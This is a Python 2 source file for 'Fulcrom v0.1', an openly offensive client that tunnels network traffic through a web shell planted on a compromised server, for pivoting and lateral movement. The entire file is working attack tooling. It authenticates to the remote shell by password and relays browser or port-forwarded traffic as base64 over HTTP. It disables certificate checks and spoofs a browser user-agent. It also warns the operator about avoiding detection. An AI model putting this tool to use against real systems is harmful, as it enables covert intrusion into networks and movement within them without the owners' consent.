# [*]Fulcrom v0.1 (c) 2017 by Paul Mueller
# [*]A Web Shell for pivoting and lateral movement 
# [*]Written by Paul Mueller
# [*]Originally a fork of Tunna by Nikos Vassakis at secforce.com 
# [*](c) 2013 by Nikos Vassakis
import urllib2
import cookielib
import gzip, zlib, StringIO
from time import time, sleep
import threading, thread
import socket
import getopt, sys
import base64
from urlparse import urlparse
import ssl
import traceback
import socks
from socksipyhandler import *
import select
from netaddr import IPNetwork, IPAddress

#DISABLE/ENABLE SSL WARNINGS WHEN CONNECTING TO SSL SYSTEMS (DISABLE SET TO DEFAULT)
ctx = ssl.create_default_context()
ctx.check_hostname = False
ctx.verify_mode = ssl.CERT_NONE

header="?head"
valid_http_verbs = ['GET','HEAD','POST','PUT','DELETE','CONNECT','OPTIONS','TRACE','PATCH']

class PortFwdServer(): 
    def __init__(self,localport):
        self.localport = localport 
        self.http_channel = {}
        self.mutex_http_req = threading.Lock()
        self.ptc=threading.Condition()
        self.penalty=0
        print '[+]Starting server on port %d' % self.localport
        try:
            self.server = socket.socket(socket.AF_INET, socket.SOCK_STREAM) 
            self.server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            self.server.bind(('0.0.0.0',localport))
            self.server.listen(100)
            
        except Exception as e:
            print 'Exception while initializing the server %r' % e

    def on_close(self):
        self.pt._Thread__stop()        #Stop socket thread and exit
        print "[-] Disconnected"
        exit()

    def run(self):
        self.mutex_http_req.acquire()
        self.http_channel[0] = self.server
        self.mutex_http_req.release()    
        self.pt = threading.Thread(name='ping', target=self.Pinging_Thread, args=()) #Start a separate thread to check for incoming data when we didnt send any
        self.pt.setDaemon(1)                #will exit if main exits
        
        if start_p_thread == True:
            self.pt.start()
  
        while 1:          
            sleep(0.01)
            ss = select.select
            inputready,outputready,exceptready = ss(self.http_channel.values(),[],[])
            for self.s in inputready:
                if self.s == self.server:
                    if hasattr(self,'PortFwdSocket'):
                        t,a = self.server.accept()
                        t.close
                    else:
                        self.PortFwdSocket,address = self.server.accept()
                        print "[+] Connected from %s" % str(address)
                        self.mutex_http_req.acquire()
                        self.http_channel[address] = self.PortFwdSocket
                        self.mutex_http_req.release()
                    break
                elif self.s == self.PortFwdSocket:
                    try:
                        #print 'receive data'
                        self.data = self.s.recv(4096)
                    except:
                        print '[!] COULD NOT READ DATA FROM LOCAL SIDE OF SOCKET. MAYBE THE BROWSER ALREADY CLOSED?'
                        self.on_close()
                        break
                    if len(self.data) == 0:
                        self.on_close()
                        break
                    else:
                        if self.pt.isAlive() == False:
                            self.start_p_thread = True
                            self.pt.start()
                        self.on_recv()
                else:
                   print '[x]YOU SHOULD NEVER SEE THIS'
  
    def Pinging_Thread(self):
        print "[+] Starting Ping thread"
        wait = True
        while 1:                            #loop forever
            if wait:
                self.ptc.acquire()
                self.ptc.wait(interval + self.penalty)
                self.ptc.release()
            self.mutex_http_req.acquire()    #Ensure that the other thread is not making a request at this time
            try:
                resp_data=HTTPreq(url,data="",header=header + '&proxy')    #Read response
                if self.penalty < 60:
                    self.penalty += interval
                if resp_data:                    #If response had data write them to socket
                    print '[+]RECEIVED %s BYTES' % str((len(resp_data) / 4) * 3)
                    self.penalty = 0
                    try:
                        self.PortFwdSocket.send(base64.urlsafe_b64decode(resp_data))        #write to socket
                    except:
                        w = open('debug2.log','a')
                        w.write(resp_data + "\n")
                        w.close()
                    resp_data=""                #clear data
                    wait = False                #Dont wait: if there was data probably there are more
                else:
                    wait = True
            except Exception as e:
                print '[!]ERROR OCCURRED. MESSAGE: %s' % e
                self.PortFwdSocket.close()
                thread.exit()
            finally:
                    self.mutex_http_req.release()    
        print "[-] Pinging Thread Exited"
        thread.interrupt_main()        #Signal main thread -> exits

    def on_recv(self):
        self.mutex_http_req.acquire()     
        try:
            print '[+]SENT %s BYTES' % str(len(self.data))
            resp_data=HTTPreq(url,data=self.data,header=header + '&proxy')        #send data with a HTTP post
            if resp_data:                            #If data is received back write them to socket
                try:
                    self.PortFwdSocket.send(base64.urlsafe_b64decode(resp_data))        #write to socket
                except Exception as e:
                    print '[!]Error sending data to local socket! Message: %s' % e
                resp_data=""                        #clear data

        except Exception, e:
            print '[!]ERROR OCCURED. MESSAGE: %s' % e
        finally:
            self.mutex_http_req.release()
            self.penalty = 0
            self.ptc.acquire()
            self.ptc.notify()
            self.ptc.release()

    def handle_close(self):            #Client disconnected
        self.pt._Thread__stop()        #Stop socket thread and exit
        print "[-] Disconnected"
        exit()
 
class HttpProxyServer():
    
    def __init__(self,localport):
        self.mutex_stale = threading.Lock() #Since we are multi-threading, he have to lock when multiple threads might access the same objects
        self.mutex_http_req = threading.Lock() 

        
        self.http_channel = {}
        self.localport = localport

        print '[+] Starting server on port %d' % self.localport
        try:
            self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            self.socket.bind(('127.0.0.1', self.localport))
            self.socket.listen(100)
        except Exception as e:
            print '[!]Exception while initializing the server %r' % e
        self.init_receive_thread()

    def isolated_thread(self,clientid,scket):
        if verbose:
            print '[+]THREAD %s STARTING!' % str(clientid)
        moveon = False
        while moveon == False:
            sleep(0.01)
            response = HTTPreq(url,data="",header="?head&data&clientid=%s" % clientid) #Make the request, checking if there is data for us
            if response: #if we have data....
                if clientid in self.stale.keys(): #If this connection was in the stale list....
                    self.mutex_stale.acquire()
                    if verbose:
                        print '[*]RELEASING ITEM %s FROM STALE LIST' % str(clientid)
                    del self.stale[clientid] #remove it now
                    self.mutex_stale.release()
                finaldata = base64.urlsafe_b64decode(response) #decode the data
                try:
                    scket.send(finaldata) #put it on the socket to pass back to local side
                except:
                    print '[!] FAILED TO SEND DATA TO LOCAL END OF SOCKET FOR SOURCE PORT %s. BROWSER LIKELY STOPPED LISTENING!' % clientid
                    self.marked_for_delete.append(clientid) #something went wrong, we need to clean up the socket
                    moveon = True #its time to go check the next socket
            else:
                moveon = True
                if clientid not in self.stale.keys(): #if its not already listed in stale
                    self.mutex_stale.acquire()
                    if verbose:
                        print 'ADDED %s to STALE LIST' % str(clientid)
                    self.stale[clientid] = int(time()) #place in stale list and provide the current time
                    self.mutex_stale.release()
        if verbose:       
            print '[-]THREAD %s EXITING AFTER %s SECOND COOLDOWN!' % (str(clientid),cooldown_timer)
        sleep(cooldown_timer)
        return
        
        
        
        
    def receive_thread(self):
        last_data = int(time())
        print "[+] STARTED MAIN RECEIVE THREAD"
        wait = True
        self.marked_for_delete = []
        self.thread_dex = {}
        printed_time = 0
        self.stale = {}
        while 1:
            sleep(0.01)
            ####SOCKET DEBUG SECTION####
            if verbose:
                if (int(time()) % 10 == 0):
                    if printed_time != int(time()):
                        print '[!]CURRENT OPEN SOCKETS:'
                        for k,v in self.http_channel.iteritems():
                            print '[*]CLIENT ID (SOURCE PORT): %s, HOST: %s' % (k,v)
                        printed_time = int(time())
            ####DEBUG SECTION####
            self.mutex_http_req.acquire()
            temp_http_channel = self.http_channel.copy()
            self.mutex_http_req.release()
            for clientid,scket in temp_http_channel.iteritems():
                if clientid != 0: #clientID is zero for the client<-> server connection
                    if clientid in self.thread_dex.keys(): #if we know about this thread already, check and see if its still running
                        if self.thread_dex[clientid].isAlive():
                            pass #if its running leave it along, it may still be moving data
                        else:
                            del self.thread_dex[clientid] #clean up dead threads
                            if verbose:
                                print '[-] CLOSED THREAD FOR CLIENT ID:%s' % str(clientid)

                    else:

                        self.thread_dex[clientid] = threading.Thread(target=self.isolated_thread,args=(clientid,scket)) #start an individual thread to go check if there is data for us on this socket and transfer it if there is
                        self.thread_dex[clientid].start()

            if len(self.stale) > 0: #If we have any stale items, lets address them now
                self.mutex_stale.acquire()
                for s,t in self.stale.iteritems():
                    if int(time()) - t > 60: #if it has been in the list for more than 60 seconds...
                        print '[-]CONNECTION: %s STALE FOR OVER 60 SECONDS, MARKING FOR DELETION' % str(s)
                        #self.mutex_http_req.acquire()
                        self.marked_for_delete.append(s) #mark it for deletion
                        #self.mutex_http_req.release()
                self.mutex_stale.release()

            while len(self.marked_for_delete) > 0: #if we have any marked for delete items, lets address them now
                self.mutex_http_req.acquire() #since we are both deactivating sockets AND affecting the stale list, we need to aquire locks for both
                self.mutex_stale.acquire()
                self.manual_close(self.marked_for_delete.pop()) #take one of the marked for delete items, send it off to manual close....
                self.mutex_stale.release()
                self.mutex_http_req.release()
        thread.interrupt_main()    

                
    def init_receive_thread(self):    #Initialise thread
        self.rt = threading.Thread(name='receive', target=self.receive_thread, args=())
        self.rt.setDaemon(1)                #will exit if main exits
        self.rt.start()
        #self.rt2 = threading.Thread(name='receive2', target=self.receive_thread, args=())
        #self.rt2.setDaemon(1)                #will exit if main exits
        #self.rt2.start()
    
    def on_accept(self):
        clientsock, clientaddr = self.socket.accept()
        print "[+] Client ID: %s has connected" % str(clientaddr)
     #   clientsock.settimeout(3)
        
        self.mutex_http_req.acquire()
        self.http_channel[clientaddr[1]] = clientsock
        self.mutex_http_req.release()
        #self.input_list.append(clientsock)
        #if self.pingthreadstarted == False:
            #self.init_ping_thread(self.s.getpeername()[1],start=True)
            #self.pingthreadstarted = True

    def main_loop(self):
        self.mutex_http_req.acquire()
        self.http_channel[0] = self.socket
        self.mutex_http_req.release()
        self.current_id = 0 #we need a current id to know what socket we are on if its already closed so we can clean up (trying to read a closed socket it get the info leads to a crash)
        while 1:

            
            sleep(0.01)
            ss = select.select
            inputready,outputready,exceptready = ss(self.http_channel.values(),[],[])
            for self.s in inputready:
                if self.s == self.socket:
                    self.on_accept()
                    break
                try:
                    self.data = self.s.recv(4096)
                except:
                    print '[!] COULD NOT READ DATA FROM LOCAL SIDE OF SOCKET. MAYBE THE BROWSER ALREADY CLOSED?'
                    self.on_close()
                    break
                if len(self.data) == 0:
                    self.on_close()
                    break
                else:
                    self.on_recv()
  
               
    def manual_close(self,clientid):
        if clientid in self.stale.keys(): #clean stale list...
            del self.stale[clientid]
            HTTPreq(url,data='',header=header + "&close&clientid=%s" % str(clientid))    #tell server to close
        if clientid in self.http_channel.keys(): #clean socket rotation...
            self.http_channel[clientid].close() #attempt to close gracefully
            del self.http_channel[clientid]
            HTTPreq(url,data='',header=header + "&close&clientid=%s" % str(clientid)) #tell server to close
        else:
            print '[!]FAILED TO CLOSE SOCKET, PROBABLY ALREADY CLOSED'
            
    def on_close(self):
        try:
            clientid = self.http_channel.keys()[self.http_channel.values().index(self.s)] #this gets the CLIENT id from HTTP_CHANNEL directly, so even if the socket is closed it can figure it out
            self.mutex_stale.acquire()
            if clientid in self.stale.keys(): #if its in stale keys, lets make sure we delete it to keep things clean
                del self.stale[clientid]
                HTTPreq(url,data='',header=header + "&close&clientid=%s" % str(clientid)) #tell the server to close things on its end
            self.mutex_stale.release()
            
        except Exception as e: #there was an issue reading the socket
            print '[!] Error in close function. Problem getting peer name?'
            print '[!]Message: %s' % e
            #it was probably already deleted another way
        
        self.mutex_http_req.acquire()
        try:
            print "[-]Client ID %s has disconnected" % str(clientid)
            del self.http_channel[clientid] #remove the socket from the rotation...
            HTTPreq(url,data='',header= header + '&close&clientid=' + str(clientid)) #tell the server to clean up its end
        except Exception as e:
            print '[!]Error in close function. Already gone?'
            print '[!]Message: %s' % e
            #dont kill the entire thing if you cant print that its disconnected
        self.s.close() #close the socket gracefully
        self.mutex_http_req.release()

    def on_recv(self):
        try:
            sourceport = self.s.getpeername()[1]
        except Exception as e:
            print '[!]SOCKET ERROR: %s ABORTING' % e
            return
        #BROWSER -> LOCAL CLIENT
        data = self.data


        if (len(data.split(' ')[0]) > 0 and data.split(' ')[0] in valid_http_verbs):
            try:
                desthost = request_parser(data)
            except:
                print '[!]PROBLEM SETTING DESTHOST! EXITING!'
                print data
                print data.split(' ')[1]
                sys.exit(2)

            #try to resolve domain
            try:
                resolved = socket.gethostbyname(desthost.split(":")[0])
            except:
                print '[!]Aborting request for %s, cannot resolve' % desthost.split(":")[0]
                self.s.send('HTTP/1.1 400 Bad request')
                return
            
            #whitelist check
            if len(whitelist) > 0:
                foundmatch = False
                for entry in whitelist:
                    if IPAddress(resolved) in IPNetwork(entry):
                        foundmatch = True
                        break
                if foundmatch == False:
                    print '[!] Connection aborted, destination not in whitelist'
                    self.s.send('HTTP/1.1 400 Bad request')
                    return

            if (data[0:7] == "CONNECT"):
                response = HTTPreq(url,data,header="?head&setup&desthost=%s&clientid=%s" % (desthost,sourceport))

                try:
                    if base64.urlsafe_b64decode(response) == '[OK]':
                    #IT WORKED, NOW TELL THE BROWSER
                        self.s.send('HTTP/1.0 200 Connection established\r\n\r\n')
                        print '[+]Sucessful SSL negotiation for client %s to dest %s' % (sourceport,desthost)
                    elif base64.urlsafe_b64decode(response) == '[ERROR]':
                        print "[!] ERROR REACHING %s, ABORTING HTTPS TUNNEL" % desthost
                except Exception as e:
                    print '[!]ERROR SETTING UP HTTPS TUNNEL!'
                return

            else:
                response = HTTPreq(url,"",header="?head&setup&desthost=%s&clientid=%s" % (desthost,sourceport))
                try:
                    if base64.urlsafe_b64decode(response) == '[OK]':
                    #print 'IT WORKED, NOW TELL THE BROWSER'
                        print '[+]Sucessfuly prepped tunnel for client %s to dest %s' % (sourceport,desthost)
                        print '[+]SENDING HTTP REQUEST!'
                        response = HTTPreq(url,data,header="?head&data&clientid=%s" % (sourceport))
                        finaldata = base64.urlsafe_b64decode(response)
                        try:
                            self.s.send(finaldata) #put it on the socket to pass back to local side
                        except:
                            print '[!] FAILED TO SEND DATA TO LOCAL END OF SOCKET FOR SOURCE PORT %s. BROWSER LIKELY STOPPED LISTENING!' % clientid

                        
                    elif base64.urlsafe_b64decode(response) == '[ERROR]':
                        print "[!] ERROR REACHING %s, ABORTING HTTP TUNNEL" % desthost
                except Exception as e:
                    print '[!]ERROR SETTING UP HTTP TUNNEL! MESSAGE: %s' % e
                return
        
        elif (sourceport in self.http_channel.keys()):
            #found source port in list of channels, send/receive data now
            self.mutex_http_req.acquire()
            response = HTTPreq(url,data,header="?head&data&clientid=%s" % sourceport)
            if len(response) > 0:
                finaldata = base64.urlsafe_b64decode(response)
                self.s.send(finaldata)
                if verbose:                  
                    print '[!]SENDING DATA TO HOST!'
            self.mutex_http_req.release()
        else:
            print '[x]SOMETHING WENT HORRIBLY WRONG'
     
def authenticate(url,header):
    print "[+]Initial Request to get the cookie"
    HTTPreq(url,data="",header=header + '&cookie&' + password)
    sleep(1)
    
def request_parser(requeststring):
    method = requeststring.split(' ')[0]
    URI = requeststring.split(' ')[1]
    if method == 'CONNECT':
        desthost = URI
    else:
        intermediate = URI.split('//')[1].split(' ')[0].split('/')[0]
        desthost = intermediate + ":80"
    return desthost
            
def setup_tunnel(url,header):
    authenticate(url,header)
    t = threading.Thread(target=Threaded_request, args=(url,header))
    t.setDaemon(1)    #Daemonize the thread
    t.start()        #start the thread
    opener.addheaders = [('Accept-encoding', 'gzip')]

def HTTPreq(url,data,header=header):
    global globalcookie
    data = base64.urlsafe_b64encode(header + '|||' + base64.urlsafe_b64encode(data)) #base64 encode the data, combine it with the header, and base64 everything together
    if len(basicauthstring) > 4:    
        headertemp = {'Content-Type': 'application/octet-stream','Authorization':'Basic %s' % basicauthstring}
    else: 
        headertemp = {'Content-Type': 'application/octet-stream'}
    headertemp['User-Agent'] = USERAGENT 
    headertemp['Connection'] = "close"
    if globalcookie != '':
        headertemp['Cookie'] = globalcookie

    f=opener.open(urllib2.Request(url,data,headers=headertemp))
    if 'set-cookie' in f.headers:
        globalcookie = globalcookie + ";" + f.headers['set-cookie']
        sleep(0.02)
    if ('Content-Encoding' in f.info().keys() and f.info()['Content-Encoding']=='gzip') or \
        ('content-encoding' in f.info().keys() and f.info()['content-encoding']=='gzip'):
        url_f = StringIO.StringIO(f.read())    
        data = gzip.GzipFile(fileobj=url_f).read()
    else:    #response not encoded
        data = f.read()
    return  data    #Return response

def Threaded_request(url,header):
    global remote_ip
    print '[+] Spawning keep-alive thread'    
    if remote_ip:     
        resp = HTTPreq(url,data='',header =(header + "&proxy" + "&port="+str(remote_port)+"&ip="+str(remote_ip)))
    else:
        resp = HTTPreq(url,data='',header=(header + "&proxy" + "&port="+str(remote_port)))
    if(resp != '[OK]'):                #if ok is not received something went wrong (if nothing is received: it's a PHP webshell)
        print '[-] Keep-alive thread exited'
        thread.interrupt_main()
    else:                            #If ok is received (non-php webshell): Thread not needed
        print '[-] Keep-alive thread not required'

def banner():
    print '''
############################################################
 _______ _     _        _______  ______  _____  _______
 |______ |     | |      |       |_____/ |     | |  |  |
 |       |_____| |_____ |_____  |    \_ |_____| |  |  |

 [*]Fulcrom v0.1 (c) 2017 by Paul Mueller
 [*]A Web Shell for pivoting and lateral movement 
 [*]Written by Paul Mueller
 [*]Originally a fork of Tunna by Nikos Vassakis at secforce.com 
 [*](c) 2013 by Nikos Vassakis
############################################################ 
'''
def usage():
    banner()
    print "Usage: python proxy.py -u <remoteurl> -l <localport> -p <password> -m <mode>[options]"
    print "    -u:          url of the remote webshell"
    print "    -l:          local port of webshell"
    print "    -p:          Password for the web shell"
    print "    -r:          Remote port of service for the webshell to connect to when using PORTFWD mode"
    print "    -m:          The mode of operation. (PORTFWD, or HTTP)"
    print "    -q:          webshell pinging thread interval (default = 0.5)"
    print "    -a:          address for remote webshell to connect to (default = 127.0.0.1)"
    print "    -b:          HTTP request size (some webshels have limitations on the size)"    
    print "    -s:          start the pinging thread first - some services send data first (SSH)"    
    print "    -v:          Verbose (outputs packet size)"
    print "    -c:          use predefined authentication cookie (cookiename=cookievalue)"
    print "    -h:          Help page"
    print "    -w:          Sets a whitelist of allowed destination IP addresses"
    print "    -g:          Set a custom user-agent string for use in requests"
    print "    -z:          {basic auth string} include this basic auth string in requests"
    print "    -x:          Upstream SOCKS Proxy"
    print "    -y:          Upstream HTTP Proxy"

def printerrors(errorarray):
    print '\n#!#!#!#!#!#!#!#!#!#!#!ERROR!#!#!#!#!#!#!#!#!#!#!#!!#!#!#\n'
    for error in errorarray:
        print error
    print '\n#!#!#!#!#!#!#!#!#!#!#!#!#!#!#!#!#!#!#!#!#!#!#!#!#!!#!#!#\n'
    usage()
    sys.exit(2)

def main():
#SET AND INITIALIZE VARIABLES
    #I know global variables are frowned upon, but the multithreading makes it hard not to use them
    global url
    global password
    global header
    global localport
    global remote_port
    global verbose
    global ping_delay
    global interval
    global remote_ip    
    global start_p_thread
    global bufferSize
    global globalcookie
    global upstream_socks
    global opener
    global basicauthstring
    global whitelist
    global USERAGENT
    global cooldown_timer
    cooldown_timer = 3
    globalcookie = ''
    basicauthstring = ''
    password = ""
    header = ''
    mode = ''
    localport=0
    remote_port=0
    url=''
    whitelist = []
    upstream_socks = False
    upstream_http = False
    verbose=False
    ping_delay = 1.5
    interval = 0.5
    send=0
    received=0
    received_pt=0
    pings=0
    localport=0
    remote_port=0
    remote_ip="127.0.0.1"
    USERAGENT="Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/40.0.2214.85 Safari/537.36"
    start_p_thread=False
    bufferSize=4064

#CLI ARGUMENT HANDLING

    try:
        opts, args = getopt.getopt(sys.argv[1:], "vhsd:a:u:l:r:q:b:p:x:c:m:y:z:w:g:", ["help"])
    except getopt.GetoptError as e:
        errorarray = []
        errorarray.append('[!]' + str(e))
        printerrors(errorarray)
        sys.exit(2)
  
    try:
        for o, a in opts:
            if o in ("-h", "--help"):
                usage()
                sys.exit()
            if o == "-u":
                url=a
                header="?head"
            if o == "-l":
                localport=int(a)
            if o == "-r":
                            remote_port=int(a)
            if o == "-v":
                            verbose = True
            if o == "-d":
                            interval=int(a)
            if o == "-q":
                            ping_delay=int(a)
            if o == "-m":
                            mode=(a)
            if o == "-a":
                            remote_ip=a
            if o == "-b":
                            bufferSize=int(a)
            if o == "-s":
                            start_p_thread=True
            if o == "-p":
                            password = a
            if o == "-c":
                predef_cookie = a
                globalcookie = predef_cookie
            if o == "-x":
                upstream_socks = True
                u = a.split(':')
            if o == "-y":
                upstream_http = True
                u = a
            if o == "-z":
                basicauthstring = a
            if o == "-w":
                whitelist = a.split(',')     
            if o == "-g":
                USERAGENT = a

                            
    except Exception as e:
            print 'EXCEPTION!'

    #SET UP UPSTREAM SOCKS PROXY IF NEEDED

    if upstream_socks == True and upstream_http == True:
        errorarray = []
        errorarray.append("[!]You cannot use a upstream socks proxy and an upstram http proxy at the same time!")
        printerrors(errorarray)

    if upstream_http == True:
        print 'YEP ITS HERE'
        print u
        proxyhandler = urllib2.ProxyHandler({'http': u,'https': u})
        print proxyhandler
        opener = urllib2.build_opener(urllib2.HTTPSHandler(context=ctx),proxyhandler)

    elif upstream_socks == True:
        opener = urllib2.build_opener(SocksiPyHandler(socks.PROXY_TYPE_SOCKS4,u[0],u[1]),urllib2.HTTPSHandler(context=ctx))
        socket.socket = socks.socksocket
        socks.setdefaultproxy(socks.PROXY_TYPE_SOCKS4, u[0],int(u[1]))
    else:
        opener = urllib2.build_opener(urllib2.HTTPSHandler(context=ctx))

    #CLI PARAMETER VALIDATION

    if mode == "":
        errorarray = []
        errorarray.append("[!]Mode not selected! Choices are: PORTFWD, SOCKS, HTTP")
        printerrors(errorarray)

    elif mode != "PORTFWD" and mode != "HTTP":
        errorarray = []
        errorarray.append("[!]Mode is not valid! Choices are: PORTFWD, HTTP")
        printerrors(errorarray)

    if localport==0 or url=="" or password=="":
        errorarray = []
        errorarray.append('(!)Missing mandatory options!')
        if localport==0:
           errorarray.append('    (-)Local port must be set!')
        if url == "":
            errorarray.append('    (-)Webshell URL must be set!')
        if password == "":
            errorarray.append('    (-)Password must be set!')
        printerrors(errorarray)

    #BEGIN HTTP BRANCH

    if mode == "HTTP":
        
        if whitelist == []:
            print '[!] WARNING! No whitelist set! Any thing your browser requests will be proxied through the target!'
            print '[!] This is not a good idea if you are trying to avoid detection!'
            confirm1 = raw_input('[!] To continue, type "I GET IT": ')
            if confirm1 != "I GET IT":
                print 'Closing...'
                sys.exit(1)
            
        print "[+]INITIALIZING HTTP PROXY MODE..."
        print "[+] Local Port listening at: %d" % localport
        authenticate(url,header)
        server = HttpProxyServer(localport)
        try:
            server.main_loop()
        except KeyboardInterrupt:
            print "Ctrl C - Stopping server"
            sys.exit(1)
            
    #BEGIN PORTFWD BRANCH

    if mode == "PORTFWD":
        if remote_port == 0 or remote_port == None:
            errorarray = []
            errorarray.append('(!)In PORTFWD mode, remote port is required!')
            printerrors(errorarray)
            
        try:
            print "[+]INITIALIZING PORTFWD MODE...."
            print "[+] Local Proxy listening at localhost:%d\n\t Remote service to connect to at remotehost:%d" % (localport,remote_port)
            setup_tunnel(url,header)
            print "\n[+] Starting Main Socket Thread"
            mainrun = PortFwdServer(localport)
            mainrun.run()
        except (KeyboardInterrupt, SystemExit):
            print HTTPreq(url,data='',header=header + "&close")    #Close handler thread on remote server

if __name__ == "__main__":
    main()
